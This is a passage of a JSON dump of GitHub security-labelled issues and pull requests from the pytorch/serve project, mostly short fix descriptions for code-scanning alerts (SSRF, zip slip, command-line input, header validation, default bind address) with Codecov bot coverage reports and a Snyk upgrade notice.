[ ] Did you have fun?\r\n- [ ] Have you added tests that prove your fix is effective or that this feature works?\r\n- [ ] Has code been commented, particularly in hard-to-understand areas?\r\n- [ ] Have you made corresponding changes to the documentation?",
                "comments": [
                    {
                        "body": "## [Codecov](https://app.codecov.io/gh/pytorch/serve/pull/2685?src=pr&el=h1&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch) Report\n> Merging [#2685](https://app.codecov.io/gh/pytorch/serve/pull/2685?src=pr&el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch) (941171a) into [master](https://app.codecov.io/gh/pytorch/serve/commit/f57240fc14ee088d5355bf5f498b49b8ab987dd2?el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch) (f57240f) will **not change** coverage.\n> Report is 1 commits behind head on master.\n> The diff coverage is `n/a`.\n\n> :exclamation: Current head 941171a differs from pull request most recent head 378dd50. Consider uploading reports for the commit 378dd50 to get more accurate results\n\n```diff\n@@           Coverage Diff           @@\n##           master    #2685   +/-   ##\n=======================================\n  Coverage   72.39%   72.39%           \n=======================================\n  Files          85       85           \n  Lines        3956     3956           \n  Branches       58       58           \n=======================================\n  Hits         2864     2864           \n  Misses       1088     1088           \n  Partials        4        4           \n```\n\n\n\n:mega: We’re building smart automated test selection to slash your CI/CD build times. [Learn more](https://about.codecov.io/iterative-testing/?utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch)\n",
                        "user": "codecov[bot]",
                        "issue_author_association": "NONE",
                        "project_created_at": "2023-10-05T22:39:05Z",
                        "url": "https://github.com/pytorch/serve/pull/2685#issuecomment-1749750395"
                    }
                ],
                "pull_request": {
                    "url": "https://api.github.com/repos/pytorch/serve/pulls/2685",
                    "merged_at": "2023-10-09T22:26:24Z"
                }
            },
            {
                "url": "https://github.com/pytorch/serve/issues/2665",
                "title": "Server-side request forgery",
                "labels": [
                    "security",
                    "internal"
                ],
                "user": "msaroufim",
                "issue_author_association": "MEMBER",
                "number": 2665,
                "id": 1924977338,
                "state": "closed",
                "project_created_at": "2023-10-03T21:26:42Z",
                "closed_at": "2023-10-11T04:25:10Z",
                "body": "Tracking issue for:\r\n- [ ] https://github.com/pytorch/serve/security/code-scanning/16\r\n- [ ] https://github.com/pytorch/serve/security/code-scanning/15\r\n",
                "comments": [],
                "pull_request": null
            },
            {
                "url": "https://github.com/pytorch/serve/issues/2664",
                "title": "Uncontrolled command line",
                "labels": [
                    "security"
                ],
                "user": "msaroufim",
                "issue_author_association": "MEMBER",
                "number": 2664,
                "id": 1924976794,
                "state": "closed",
                "project_created_at": "2023-10-03T21:26:16Z",
                "closed_at": "2023-10-11T04:25:11Z",
                "body": "Tracking issue for:\r\n- [ ] https://github.com/pytorch/serve/security/code-scanning/41\r\n",
                "comments": [],
                "pull_request": null
            },
            {
                "url": "https://github.com/pytorch/serve/pull/2635",
                "title": "Uncontrolled input fix for ModelManager",
                "labels": [
                    "security"
                ],
                "user": "msaroufim",
                "issue_author_association": "MEMBER",
                "number": 2635,
                "id": 1919766424,
                "state": "closed",
                "project_created_at": "2023-09-29T18:58:15Z",
                "closed_at": "2023-09-30T00:38:55Z",
                "body": "Fixes\r\nhttps://github.com/pytorch/serve/security/code-scanning/36\r\nhttps://github.com/pytorch/serve/security/code-scanning/34",
                "comments": [
                    {
                        "body": "## [Codecov](https://app.codecov.io/gh/pytorch/serve/pull/2635?src=pr&el=h1&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch) Report\n> Merging [#2635](https://app.codecov.io/gh/pytorch/serve/pull/2635?src=pr&el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch) (8ac8305) into [master](https://app.codecov.io/gh/pytorch/serve/commit/d8a11464b098c17207d96a35d89cb83b412a0433?el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch) (d8a1146) will **not change** coverage.\n> Report is 3 commits behind head on master.\n> The diff coverage is `n/a`.\n\n> :exclamation: Current head 8ac8305 differs from pull request most recent head 4a0eed0. Consider uploading reports for the commit 4a0eed0 to get more accurate results\n\n```diff\n@@           Coverage Diff           @@\n##           master    #2635   +/-   ##\n=======================================\n  Coverage   71.34%   71.34%           \n=======================================\n  Files          85       85           \n  Lines        3905     3905           \n  Branches       58       58           \n=======================================\n  Hits         2786     2786           \n  Misses       1115     1115           \n  Partials        4        4           \n```\n\n\n\n:mega: We’re building smart automated test selection to slash your CI/CD build times. [Learn more](https://about.codecov.io/iterative-testing/?utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch)\n",
                        "user": "codecov[bot]",
                        "issue_author_association": "NONE",
                        "project_created_at": "2023-09-29T21:04:59Z",
                        "url": "https://github.com/pytorch/serve/pull/2635#issuecomment-1741487038"
                    }
                ],
                "pull_request": {
                    "url": "https://api.github.com/repos/pytorch/serve/pulls/2635",
                    "merged_at": "2023-09-30T00:38:55Z"
                }
            },
            {
                "url": "https://github.com/pytorch/serve/pull/2634",
                "title": "fix zip slip",
                "labels": [
                    "security"
                ],
                "user": "msaroufim",
                "issue_author_association": "MEMBER",
                "number": 2634,
                "id": 1919742519,
                "state": "closed",
                "project_created_at": "2023-09-29T18:35:54Z",
                "closed_at": "2023-09-30T00:06:04Z",
                "body": "Fixes\r\nhttps://github.com/pytorch/serve/security/code-scanning/14\r\nhttps://github.com/pytorch/serve/security/code-scanning/2",
                "comments": [
                    {
                        "body": "## [Codecov](https://app.codecov.io/gh/pytorch/serve/pull/2634?src=pr&el=h1&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch) Report\n> Merging [#2634](https://app.codecov.io/gh/pytorch/serve/pull/2634?src=pr&el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch) (b76e40d) into [master](https://app.codecov.io/gh/pytorch/serve/commit/d8a11464b098c17207d96a35d89cb83b412a0433?el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch) (d8a1146) will **decrease** coverage by `0.11%`.\n> Report is 3 commits behind head on master.\n> The diff coverage is `n/a`.\n\n> :exclamation: Current head b76e40d differs from pull request most recent head f206a65. Consider uploading reports for the commit f206a65 to get more accurate results\n\n```diff\n@@            Coverage Diff             @@\n##           master    #2634      +/-   ##\n==========================================\n- Coverage   71.34%   71.24%   -0.11%     \n==========================================\n  Files          85       85              \n  Lines        3905     3905              \n  Branches       58       58              \n==========================================\n- Hits         2786     2782       -4     \n- Misses       1115     1119       +4     \n  Partials        4        4              \n```\n\n\n[see 2 files with indirect coverage changes](https://app.codecov.io/gh/pytorch/serve/pull/2634/indirect-changes?src=pr&el=tree-more&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch)\n\n:mega: We’re building smart automated test selection to slash your CI/CD build times. [Learn more](https://about.codecov.io/iterative-testing/?utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch)\n",
                        "user": "codecov[bot]",
                        "issue_author_association": "NONE",
                        "project_created_at": "2023-09-29T18:52:55Z",
                        "url": "https://github.com/pytorch/serve/pull/2634#issuecomment-1741346632"
                    }
                ],
                "pull_request": {
                    "url": "https://api.github.com/repos/pytorch/serve/pulls/2634",
                    "merged_at": "2023-09-30T00:06:04Z"
                }
            },
            {
                "url": "https://github.com/pytorch/serve/pull/2633",
                "title": "wip Add url validation in s3 utils",
                "labels": [
                    "security"
                ],
                "user": "msaroufim",
                "issue_author_association": "MEMBER",
                "number": 2633,
                "id": 1919723001,
                "state": "closed",
                "project_created_at": "2023-09-29T18:18:49Z",
                "closed_at": "2023-10-06T03:42:44Z",
                "body": "Solves\r\nhttps://github.com/pytorch/serve/security/code-scanning/16\r\nhttps://github.com/pytorch/serve/security/code-scanning/15\r\n\r\nNot sure what's the right way to change the failing tests now that an IllegalArgumentException will be the default\r\n\r\nEDIT: Ok I'm gonna move on to something else, this PR is a bit annoying to merge since it will make breaking changes to the HTTP status to a lot of requests, will look at other stuff when i have free time",
                "comments": [],
                "pull_request": {
                    "url": "https://api.github.com/repos/pytorch/serve/pulls/2633",
                    "merged_at": null
                }
            },
            {
                "url": "https://github.com/pytorch/serve/pull/2632",
                "title": "Use process build for GPU command",
                "labels": [
                    "security"
                ],
                "user": "msaroufim",
                "issue_author_association": "MEMBER",
                "number": 2632,
                "id": 1919683250,
                "state": "closed",
                "project_created_at": "2023-09-29T17:45:20Z",
                "closed_at": "2023-09-30T00:19:52Z",
                "body": "Solves https://github.com/pytorch/serve/security/code-scanning/4",
                "comments": [
                    {
                        "body": "## [Codecov](https://app.codecov.io/gh/pytorch/serve/pull/2632?src=pr&el=h1&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch) Report\n> Merging [#2632](https://app.codecov.io/gh/pytorch/serve/pull/2632?src=pr&el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch) (4ffdd87) into [master](https://app.codecov.io/gh/pytorch/serve/commit/d8a11464b098c17207d96a35d89cb83b412a0433?el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch) (d8a1146) will **decrease** coverage by `0.11%`.\n> Report is 3 commits behind head on master.\n> The diff coverage is `n/a`.\n\n> :exclamation: Current head 4ffdd87 differs from pull request most recent head 722b337. Consider uploading reports for the commit 722b337 to get more accurate results\n\n```diff\n@@            Coverage Diff             @@\n##           master    #2632      +/-   ##\n==========================================\n- Coverage   71.34%   71.24%   -0.11%     \n==========================================\n  Files          85       85              \n  Lines        3905     3905              \n  Branches       58       58              \n==========================================\n- Hits         2786     2782       -4     \n- Misses       1115     1119       +4     \n  Partials        4        4              \n```\n\n\n[see 2 files with indirect coverage changes](https://app.codecov.io/gh/pytorch/serve/pull/2632/indirect-changes?src=pr&el=tree-more&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch)\n\n:mega: We’re building smart automated test selection to slash your CI/CD build times. [Learn more](https://about.codecov.io/iterative-testing/?utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch)\n",
                        "user": "codecov[bot]",
                        "issue_author_association": "NONE",
                        "project_created_at": "2023-09-29T18:38:35Z",
                        "url": "https://github.com/pytorch/serve/pull/2632#issuecomment-1741331805"
                    }
                ],
                "pull_request": {
                    "url": "https://api.github.com/repos/pytorch/serve/pulls/2632",
                    "merged_at": "2023-09-30T00:19:52Z"
                }
            },
            {
                "url": "https://github.com/pytorch/serve/pull/2631",
                "title": "Default Hostname verifier in Test",
                "labels": [
                    "security"
                ],
                "user": "msaroufim",
                "issue_author_association": "MEMBER",
                "number": 2631,
                "id": 1919667058,
                "state": "closed",
                "project_created_at": "2023-09-29T17:31:12Z",
                "closed_at": "2023-09-29T18:33:07Z",
                "body": "Solves https://github.com/pytorch/serve/security/code-scanning/10",
                "comments": [
                    {
                        "body": "## [Codecov](https://app.codecov.io/gh/pytorch/serve/pull/2631?src=pr&el=h1&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch) Report\n> Merging [#2631](https://app.codecov.io/gh/pytorch/serve/pull/2631?src=pr&el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch) (795dac0) into [master](https://app.codecov.io/gh/pytorch/serve/commit/d8a11464b098c17207d96a35d89cb83b412a0433?el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch) (d8a1146) will **decrease** coverage by `0.11%`.\n> Report is 2 commits behind head on master.\n> The diff coverage is `n/a`.\n\n> :exclamation: Current head 795dac0 differs from pull request most recent head d7bd0a1. Consider uploading reports for the commit d7bd0a1 to get more accurate results\n\n```diff\n@@            Coverage Diff             @@\n##           master    #2631      +/-   ##\n==========================================\n- Coverage   71.34%   71.24%   -0.11%     \n==========================================\n  Files          85       85              \n  Lines        3905     3905              \n  Branches       58       58              \n==========================================\n- Hits         2786     2782       -4     \n- Misses       1115     1119       +4     \n  Partials        4        4              \n```\n\n\n[see 2 files with indirect coverage changes](https://app.codecov.io/gh/pytorch/serve/pull/2631/indirect-changes?src=pr&el=tree-more&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch)\n\n:mega: We’re building smart automated test selection to slash your CI/CD build times. [Learn more](https://about.codecov.io/iterative-testing/?utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch)\n",
                        "user": "codecov[bot]",
                        "issue_author_association": "NONE",
                        "project_created_at": "2023-09-29T17:54:27Z",
                        "url": "https://github.com/pytorch/serve/pull/2631#issuecomment-1741284264"
                    }
                ],
                "pull_request": {
                    "url": "https://api.github.com/repos/pytorch/serve/pulls/2631",
                    "merged_at": "2023-09-29T18:33:07Z"
                }
            },
            {
                "url": "https://github.com/pytorch/serve/pull/2630",
                "title": "Enable Netty HTTP header validation",
                "labels": [
                    "security"
                ],
                "user": "msaroufim",
                "issue_author_association": "MEMBER",
                "number": 2630,
                "id": 1919638113,
                "state": "closed",
                "project_created_at": "2023-09-29T17:07:12Z",
                "closed_at": "2023-09-30T00:22:43Z",
                "body": "Solves\r\nhttps://github.com/pytorch/serve/security/code-scanning/5\r\nhttps://github.com/pytorch/serve/security/code-scanning/6\r\nhttps://github.com/pytorch/serve/security/code-scanning/8\r\nhttps://github.com/pytorch/serve/security/code-scanning/9",
                "comments": [
                    {
                        "body": "## [Codecov](https://app.codecov.io/gh/pytorch/serve/pull/2630?src=pr&el=h1&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch) Report\n> Merging [#2630](https://app.codecov.io/gh/pytorch/serve/pull/2630?src=pr&el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch) (728afb1) into [master](https://app.codecov.io/gh/pytorch/serve/commit/d8a11464b098c17207d96a35d89cb83b412a0433?el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch) (d8a1146) will **decrease** coverage by `0.11%`.\n> Report is 1 commits behind head on master.\n> The diff coverage is `n/a`.\n\n> :exclamation: Current head 728afb1 differs from pull request most recent head 6f83d44. Consider uploading reports for the commit 6f83d44 to get more accurate results\n\n```diff\n@@            Coverage Diff             @@\n##           master    #2630      +/-   ##\n==========================================\n- Coverage   71.34%   71.24%   -0.11%     \n==========================================\n  Files          85       85              \n  Lines        3905     3905              \n  Branches       58       58              \n==========================================\n- Hits         2786     2782       -4     \n- Misses       1115     1119       +4     \n  Partials        4        4              \n```\n\n\n[see 2 files with indirect coverage changes](https://app.codecov.io/gh/pytorch/serve/pull/2630/indirect-changes?src=pr&el=tree-more&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch)\n\n:mega: We’re building smart automated test selection to slash your CI/CD build times. [Learn more](https://about.codecov.io/iterative-testing/?utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch)\n",
                        "user": "codecov[bot]",
                        "issue_author_association": "NONE",
                        "project_created_at": "2023-09-29T17:22:54Z",
                        "url": "https://github.com/pytorch/serve/pull/2630#issuecomment-1741249202"
                    },
                    {
                        "body": "I'm not sure if there is a history reason of setting false at beginning. I suggest making it configurable (default: true) to avoid breaking some cx prod.",
                        "user": "lxning",
                        "issue_author_association": "COLLABORATOR",
                        "project_created_at": "2023-09-30T19:06:30Z",
                        "url": "https://github.com/pytorch/serve/pull/2630#issuecomment-1741838558"
                    },
                    {
                        "body": "Would be nice to have sanity checks in CI for what sagemaker might do but regardless I opened this issue to follow up on later https://github.com/pytorch/serve/issues/2639 - would be great if someone wants to pick this up",
                        "user": "msaroufim",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2023-09-30T19:20:51Z",
                        "url": "https://github.com/pytorch/serve/pull/2630#issuecomment-1741841434"
                    }
                ],
                "pull_request": {
                    "url": "https://api.github.com/repos/pytorch/serve/pulls/2630",
                    "merged_at": "2023-09-30T00:22:43Z"
                }
            },
            {
                "url": "https://github.com/pytorch/serve/pull/2629",
                "title": "Use Sha-256 in ziputils",
                "labels": [
                    "security"
                ],
                "user": "msaroufim",
                "issue_author_association": "MEMBER",
                "number": 2629,
                "id": 1919585288,
                "state": "closed",
                "project_created_at": "2023-09-29T16:31:54Z",
                "closed_at": "2023-09-29T17:46:42Z",
                "body": "Solves https://github.com/pytorch/serve/security/code-scanning/11",
                "comments": [
                    {
                        "body": "## [Codecov](https://app.codecov.io/gh/pytorch/serve/pull/2629?src=pr&el=h1&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch) Report\n> Merging [#2629](https://app.codecov.io/gh/pytorch/serve/pull/2629?src=pr&el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch) (c9b8c05) into [master](https://app.codecov.io/gh/pytorch/serve/commit/d8a11464b098c17207d96a35d89cb83b412a0433?el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch) (d8a1146) will **decrease** coverage by `0.11%`.\n> The diff coverage is `n/a`.\n\n> :exclamation: Current head c9b8c05 differs from pull request most recent head a540cd9. Consider uploading reports for the commit a540cd9 to get more accurate results\n\n```diff\n@@            Coverage Diff             @@\n##           master    #2629      +/-   ##\n==========================================\n- Coverage   71.34%   71.24%   -0.11%     \n==========================================\n  Files          85       85              \n  Lines        3905     3905              \n  Branches       58       58              \n==========================================\n- Hits         2786     2782       -4     \n- Misses       1115     1119       +4     \n  Partials        4        4              \n```\n\n\n[see 2 files with indirect coverage changes](https://app.codecov.io/gh/pytorch/serve/pull/2629/indirect-changes?src=pr&el=tree-more&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch)\n\n:mega: We’re building smart automated test selection to slash your CI/CD build times. [Learn more](https://about.codecov.io/iterative-testing/?utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch)\n",
                        "user": "codecov[bot]",
                        "issue_author_association": "NONE",
                        "project_created_at": "2023-09-29T16:48:19Z",
                        "url": "https://github.com/pytorch/serve/pull/2629#issuecomment-1741201764"
                    }
                ],
                "pull_request": {
                    "url": "https://api.github.com/repos/pytorch/serve/pulls/2629",
                    "merged_at": "2023-09-29T17:46:42Z"
                }
            },
            {
                "url": "https://github.com/pytorch/serve/pull/2624",
                "title": "Update default address from 0.0.0.0 to 127.0.0.1 in documentation and examples",
                "labels": [
                    "security"
                ],
                "user": "namannandan",
                "issue_author_association": "COLLABORATOR",
                "number": 2624,
                "id": 1916380312,
                "state": "closed",
                "project_created_at": "2023-09-27T21:46:13Z",
                "closed_at": "2023-10-02T17:12:53Z",
                "body": "Fixes #2610 ",
                "comments": [
                    {
                        "body": "## [Codecov](https://app.codecov.io/gh/pytorch/serve/pull/2624?src=pr&el=h1&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch) Report\n> Merging [#2624](https://app.codecov.io/gh/pytorch/serve/pull/2624?src=pr&el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch) (5e3c1b9) into [master](https://app.codecov.io/gh/pytorch/serve/commit/8bd76ee5234801c7c925f9429168fb0ec3735a26?el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch) (8bd76ee) will **increase** coverage by `1.89%`.\n> Report is 118 commits behind head on master.\n> The diff coverage is `73.47%`.\n\n> :exclamation: Current head 5e3c1b9 differs from pull request most recent head c5d0cef. Consider uploading reports for the commit c5d0cef to get more accurate results\n\n```diff\n@@            Coverage Diff             @@\n##           master    #2624      +/-   ##\n==========================================\n+ Coverage   69.44%   71.34%   +1.89%     \n==========================================\n  Files          77       85       +8     \n  Lines        3450     3905     +455     \n  Branches       57       58       +1     \n==========================================\n+ Hits         2396     2786     +390     \n- Misses       1051     1115      +64     \n- Partials        3        4       +1     \n```\n\n\n| [Files](https://app.codecov.io/gh/pytorch/serve/pull/2624?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch) | Coverage Δ | |\n|---|---|---|\n| [...l-archiver/model\\_archiver/model\\_packaging\\_utils.py](https://app.codecov.io/gh/pytorch/serve/pull/2624?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch#diff-bW9kZWwtYXJjaGl2ZXIvbW9kZWxfYXJjaGl2ZXIvbW9kZWxfcGFja2FnaW5nX3V0aWxzLnB5) | `92.30% <100.00%> (+32.17%)` | :arrow_up: |\n| [setup.py](https://app.codecov.io/gh/pytorch/serve/pull/2624?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch#diff-c2V0dXAucHk=) | `0.00% <ø> (ø)` | |\n| [ts/arg\\_parser.py](https://app.codecov.io/gh/pytorch/serve/pull/2624?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch#diff-dHMvYXJnX3BhcnNlci5weQ==) | `25.80% <ø> (ø)` | |\n| [ts/context.py](https://app.codecov.io/gh/pytorch/serve/pull/2624?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch#diff-dHMvY29udGV4dC5weQ==) | `67.53% <ø> (ø)` | |\n| [ts/metrics/caching\\_metric.py](https://app.codecov.io/gh/pytorch/serve/pull/2624?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch#diff-dHMvbWV0cmljcy9jYWNoaW5nX21ldHJpYy5weQ==) | `89.47% <100.00%> (ø)` | |\n| [ts/metrics/metric\\_abstract.py](https://app.codecov.io/gh/pytorch/serve/pull/2624?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch#diff-dHMvbWV0cmljcy9tZXRyaWNfYWJzdHJhY3QucHk=) | `92.85% <100.00%> (ø)` | |\n| [ts/metrics/metric\\_cache\\_abstract.py](https://app.codecov.io/gh/pytorch/serve/pull/2624?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch#diff-dHMvbWV0cmljcy9tZXRyaWNfY2FjaGVfYWJzdHJhY3QucHk=) | `93.18% <100.00%> (+0.41%)` | :arrow_up: |\n| [ts/metrics/metric\\_cache\\_yaml\\_impl.py](https://app.codecov.io/gh/pytorch/serve/pull/2624?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch#diff-dHMvbWV0cmljcy9tZXRyaWNfY2FjaGVfeWFtbF9pbXBsLnB5) | `93.24% <100.00%> (ø)` | |\n| [ts/model\\_loader.py](https://app.codecov.io/gh/pytorch/serve/pull/2624?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch#diff-dHMvbW9kZWxfbG9hZGVyLnB5) | `88.31% <ø> (ø)` | |\n| [...sts/metrics\\_yaml\\_testing/metric\\_cache\\_unit\\_test.py](https://app.codecov.io/gh/pytorch/serve/pull/2624?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch#diff-dHMvdGVzdHMvdW5pdF90ZXN0cy9tZXRyaWNzX3lhbWxfdGVzdGluZy9tZXRyaWNfY2FjaGVfdW5pdF90ZXN0LnB5) | `99.68% <100.00%> (+0.02%)` | :arrow_up: |\n| ... and [20 more](https://app.codecov.io/gh/pytorch/serve/pull/2624?src=pr&el=tree-more&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch) | |\n\n... and [3 files with indirect coverage changes](https://app.codecov.io/gh/pytorch/serve/pull/2624/indirect-changes?src=pr&el=tree-more&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch)\n\n:mega: We’re building smart automated test selection to slash your CI/CD build times. [Learn more](https://about.codecov.io/iterative-testing/?utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch)\n",
                        "user": "codecov[bot]",
                        "issue_author_association": "NONE",
                        "project_created_at": "2023-09-27T22:04:44Z",
                        "url": "https://github.com/pytorch/serve/pull/2624#issuecomment-1738138510"
                    }
                ],
                "pull_request": {
                    "url": "https://api.github.com/repos/pytorch/serve/pulls/2624",
                    "merged_at": "2023-10-02T17:12:53Z"
                }
            },
            {
                "url": "https://github.com/pytorch/serve/issues/2612",
                "title": "token based management url",
                "labels": [
                    "documentation",
                    "security"
                ],
                "user": "lxning",
                "issue_author_association": "COLLABORATOR",
                "number": 2612,
                "id": 1908226696,
                "state": "closed",
                "project_created_at": "2023-09-22T05:52:43Z",
                "closed_at": "2024-03-06T20:10:33Z",
                "body": "### 🚀 The feature\n\n- enable/disable token generation.\r\n- if enabled\r\n\r\n1. when model server starts, it generates a token to console.\r\n2. each management request requires the token and verifies it.\n\n### Motivation, pitch\n\nimplement management authentication \n\n### Alternatives\n\n_No response_\n\n### Additional context\n\n_No response_",
                "comments": [
                    {
                        "body": "Token authorization plugin added https://github.com/pytorch/serve/pull/2888",
                        "user": "udaij12",
                        "issue_author_association": "COLLABORATOR",
                        "project_created_at": "2024-03-06T20:10:33Z",
                        "url": "https://github.com/pytorch/serve/issues/2612#issuecomment-1981699726"
                    }
                ],
                "pull_request": null
            },
            {
                "url": "https://github.com/pytorch/serve/issues/2611",
                "title": "docker port ",
                "labels": [
                    "documentation",
                    "docker",
                    "security"
                ],
                "user": "lxning",
                "issue_author_association": "COLLABORATOR",
                "number": 2611,
                "id": 1908206476,
                "state": "closed",
                "project_created_at": "2023-09-22T05:29:25Z",
                "closed_at": "2023-10-28T19:45:44Z",
                "body": "### 📚 The doc issue\n\nUpdate the docker instruction for dev: how to prevent exposed port from getting access by outside connection.\n\n### Suggest a potential alternative/fix\n\n_No response_",
                "comments": [],
                "pull_request": null
            },
            {
                "url": "https://github.com/pytorch/serve/issues/2610",
                "title": "default IP address setting",
                "labels": [
                    "security"
                ],
                "user": "lxning",
                "issue_author_association": "COLLABORATOR",
                "number": 2610,
                "id": 1908175107,
                "state": "closed",
                "project_created_at": "2023-09-22T04:47:44Z",
                "closed_at": "2023-10-03T17:39:18Z",
                "body": "### 🚀 The feature\n\n1. There are multiple places using \"0.0.0.0\" as default address. It should be replaced with localhost.\r\n\r\n- examples\r\n- config.properties\r\n- code\r\n- launcher.gradle\r\n- Dockerfile\r\n\r\n2. Server throws fatal error if \"0.0.0.0\" is set in dev docker.\r\n3. Server throws error if \"0.0.0.0\" is set in prod docker.\n\n### Motivation, pitch\n\nthe management interface API is bound to the 0.0.0.0 address by default, making it accessible to external requests. This exposes a potential security risk to unauthorized access.\n\n### Alternatives\n\n_No response_\n\n### Additional context\n\n_No response_",
                "comments": [],
                "pull_request": null
            },
            {
                "url": "https://github.com/pytorch/serve/issues/2531",
                "title": "warning if TS_ALLOWED_URLS is using default values in config.properites",
                "labels": [
                    "security"
                ],
                "user": "lxning",
                "issue_author_association": "COLLABORATOR",
                "number": 2531,
                "id": 1859908573,
                "state": "closed",
                "project_created_at": "2023-08-21T18:22:00Z",
                "closed_at": "2023-08-22T21:23:58Z",
                "body": "### 🚀 The feature\n\nProvide the warning such as the following if TS_ALLOWED_URLS is as same as the default value.\r\n\"\r\n  log.warning(\"Your torchserve instance is accessible from any url. When you deploy it to production make sure to limit the set of allowed_urls in your config.properties\")\r\n\"\n\n### Motivation, pitch\n\nConsidering prod safety, it is better to notify cx to config \"TS_ALLOWED_URLS\"\n\n### Alternatives\n\n_No response_\n\n### Additional context\n\n_No response_",
                "comments": [],
                "pull_request": null
            },
            {
                "url": "https://github.com/pytorch/serve/pull/2239",
                "title": "[Snyk] Security upgrade ubuntu from rolling to 22.10",
                "labels": [
                    "security"
                ],
                "user": "msaroufim",
                "issue_author_association": "MEMBER",
                "number": 2239,
                "id": 1673691442,
                "state": "closed",
                "project_created_at": "2023-04-18T19:09:57Z",
                "closed_at": "2023-07-21T21:59:13Z",
                "body": "<p>This PR was automatically created by Snyk using the credentials of a real user.</p><br />Keeping your Docker base image up-to-date means you’ll benefit from security fixes in the latest version of your chosen image.\n\n#### Changes included in this PR \n\n\n- docker/Dockerfile\n\nWe recommend upgrading to `ubuntu:22.10`, as this image has only 7 known vulnerabilities. To do this, merge this pull request, then verify your application still works as expected.\n\n\n\nSome of the most important vulnerabilities in your base image include:\n\n| Severity                                                                                                           | Issue                                                                     | Exploit Maturity      |\n| :------:                                                                                                           | :----                                                                     | :---------------      |\n| ![medium severity](https://res.cloudinary.com/snyk/image/upload/w_20,h_20/v1561977819/icon/m.png \"medium severity\")   | Information Exposure <br/>[SNYK-UBUNTU2210-GNUTLS28-3319585](https://snyk.io/vuln/SNYK-UBUNTU2210-GNUTLS28-3319585)   | No Known Exploit   |\n| ![medium severity](https://res.cloudinary.com/snyk/image/upload/w_20,h_20/v1561977819/icon/m.png \"medium severity\")   | Resource Exhaustion <br/>[SNYK-UBUNTU2210-SYSTEMD-3148007](https://snyk.io/vuln/SNYK-UBUNTU2210-SYSTEMD-3148007)   | No Known Exploit   |\n| 